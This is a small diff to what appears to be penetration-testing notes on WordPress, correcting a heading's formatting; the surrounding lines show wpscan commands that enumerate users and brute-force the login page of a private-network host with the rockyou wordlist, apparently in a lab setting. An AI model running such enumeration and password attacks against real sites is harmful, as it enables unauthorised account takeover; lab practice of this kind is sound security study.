@@ -5,7 +5,7 @@ Wordpress commands
 
 wpscan --disable-tls-checks --url https://192.168.1.6:12380/blogblog -e u
 
-** Bruteforce wp login page**
+**Bruteforce wp login page**
 
 wpscan --disable-tls-checks --url https://192.168.1.6:12380/blogblog -P /usr/share/wordlists/rockyou.txt --usernames john
 
